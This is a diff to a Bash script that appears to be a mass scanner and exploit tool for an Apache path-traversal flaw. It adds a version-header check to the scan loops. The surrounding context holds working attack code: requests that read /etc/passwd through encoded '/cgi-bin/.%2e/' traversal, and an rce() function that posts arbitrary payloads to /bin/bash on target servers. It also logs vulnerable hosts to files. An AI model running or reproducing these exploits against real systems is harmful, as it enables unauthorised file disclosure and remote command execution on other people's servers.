@@ -65,6 +65,16 @@ then
     Main_Menu
     fi
 }
+
+function checkVersionHeader(){
+    numberVersion=$(curl -si "${SITE}" | grep "Server:" | sed 's/\// /g' | awk -F " " {'print $3'})
+    if [[ $(curl -si "${SITE}" | grep "Server:" | awk -F " " {'print $1" "$2'}) =~ "Server: Apache/" ]]; then
+        echo -e "${YELLOW}[!] Detected Apache version on header ${NC}[${GREEN}$numberVersion${NC}]"
+    else
+        echo -e "${YELLOW}[!] Version not detected"
+    fi
+}
+
 function rce(){
 	curl -s --data "A=|echo;${payload}" "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash"
 }
@@ -119,11 +129,14 @@ do
 	echo -e "${PINK}Mass LFI Scan process started..."
 	echo -e "${PINK}Target: ${GRAY}${SITE}..."
 		if [[ $(curl -k --silent --path-as-is --insecure "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd") =~ "root:" ]]; then
-			    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
-				echo ${SITE} >> ${savedlfi} 
+            checkVersionHeader
+			echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
+			echo ${SITE} >> ${savedlfi} 
 		elif [[ $(curl -k --silent --path-as-is --insecure "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" -w %{http_code} -o /dev/null ) =~ '500' ]]; then
+            checkVersionHeader
 		    echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
 			else :
+                checkVersionHeader
 				echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
 		fi
 done
@@ -144,10 +157,13 @@ function single_lfiscan(){
 	echo -e "${PINK}Scanning process started..."
 	echo -e "${PINK}Target: ${GRAY}${SITE}..."
 	        if [[ $(curl --silent "http://${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd") =~ "root:" ]]; then
+                checkVersionHeader
 			    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
 		elif [[ $(curl --silent "http://${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" -w %{http_code}) =~ '500' ]]; then
+            checkVersionHeader
 		    echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
 			else :
+                checkVersionHeader
 				echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
 		fi
 }
@@ -200,11 +216,14 @@ do
 	echo -e "${PINK}RCE Scanning process started..."
 	echo -e "${PINK}Target: ${GRAY}${SITE}..."
 	        if [[ $(curl --silent --data "A=|echo;id;uname -a" "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash" | tr -d '\0' ) =~ "uid=" ]]; then
+                    checkVersionHeader
 	        	    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}"
 					echo ${SITE} >> ${savedrce} 
 	        elif [[ $(curl --silent --data "A=|echo;id;uname -a" "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash" -w %{http_code} | tr -d '\0') = '500' ]]; then
+                    checkVersionHeader
 	        		echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
 	            else :
+                    checkVersionHeader
 	        		echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
             fi
     done
@@ -225,10 +244,13 @@ function single_rcescan(){
 	echo -e "${PINK}RCE Scanning process started..."
 	echo -e "${PINK}Target: ${GRAY}${SITE}..."
 	        if [[ $(curl --silent --data "A=|echo;id;uname -a" "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash" | tr -d '\0' ) =~ "uid=" ]]; then
+                    checkVersionHeader
 	        	    echo -e "${GREEN}[+] VULN:${BLUE} ${SITE}" 
 	        elif [[ $(curl --silent --data "A=|echo;id;uname -a" "${SITE}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash" -w %{http_code} | tr -d '\0') = '500' ]]; then
+                    checkVersionHeader
 	        		echo -e "${ORANGE}[+] MAYBE VULN:${BLUE} ${SITE}"
 	            else :
+                    checkVersionHeader
 	        		echo -e "${RED}[+] NOT VULN:${BLUE} ${SITE}"
             fi
 }
